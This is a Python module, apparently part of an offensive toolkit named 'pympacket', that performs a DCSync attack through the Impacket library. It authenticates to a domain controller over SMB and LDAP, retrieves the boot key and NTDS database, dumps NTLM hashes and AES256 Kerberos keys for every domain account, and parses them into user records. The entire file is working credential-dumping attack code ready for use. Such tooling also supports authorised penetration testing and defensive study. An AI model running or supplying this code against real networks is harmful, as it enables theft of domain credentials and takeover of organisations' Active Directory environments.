from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
import io
from contextlib import redirect_stdout
import sys

from pympacket.models.common import User

def get_domain_base(domain):
    domain_base = ''
    split_domain = domain.split('.')
    for dom_slice in split_domain:
        domain_base = domain_base + f'dc={dom_slice},'

    domain_base = domain_base[:-1]
    return domain_base

def dcsync(target, username, domain, password='', nthash=''):
    try:
        smb_conn = SMBConnection(target, target)
    except:
        print("Host unreachable.", file=sys.stderr)
        return None
    try:
        smb_conn.login(user=username, password=password, nthash=nthash, domain=domain)
    except:
        print("Invalid credentials provided.", file=sys.stderr)
        return None

    base_dn = get_domain_base(domain)

    try:
        ldapConnection = LDAPConnection(f'ldap://{target}', base_dn, target)
    except:
        print("LDAP connection error, the target provided must be the DC.", file=sys.stderr)
        return None
        
    # Login can't fail if it succeded with smb
    ldapConnection.login(user=username, password=password, domain=domain, nthash=nthash)

    remote_ops = RemoteOperations(smb_conn, False, target, ldapConnection)
    try:
        remote_ops.enableRegistry()
        boot_key = remote_ops.getBootKey()
        ntds_filename = remote_ops.saveNTDS()
    except DCERPCException as e:
        if str(e).find('rpc_s_access_denied') >= 0:
            print("The current user doesn't have enough rights.", file=sys.stderr)
            try:
                remote_ops.finish()
            except:
                print("Problem with cleanup.", file=sys.stderr)
            return None
        else:
            print("Error when retrieving required information via RPC.", file=sys.stderr)
            return None


    ntds = NTDSHashes(ntds_filename, boot_key, isRemote=True, remoteOps=remote_ops, justNTLM=False)

    # Capture function stdout for parsing
    f = io.StringIO()
    with redirect_stdout(f):
        try:
            ntds.dump()
        except Exception as e:
            if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                print("The current user doesn't have DCSync rights.", file=sys.stderr)
                return None
            else:
                print("Error while performing DCSync.", file=sys.stderr)
                return None
    dcsync_out = parse_output(f.getvalue())

    # Cleanup
    try:
        remote_ops.finish()
        ntds.finish()
    except:
        print("Problem with cleanup.", file=sys.stderr)

    return dcsync_out

def parse_output(ntds_dump):
    dcsync_out = []
    entries = ntds_dump.split("\n")
    for entry in entries:
        split_list = entry.split(':')
        if len(split_list) == 7:
            current_user = User()
            current_user.username = split_list[0]
            current_user.nthash = split_list[3]
            dcsync_out.append(current_user)
        elif len(split_list) == 3 and split_list[1] == 'aes256-cts-hmac-sha1-96': # Kerberos key will always come after ntlm hashes
            username = split_list[0]
            for user in dcsync_out:
                if user.username == username:
                    user.aes256 = split_list[2]
    return dcsync_out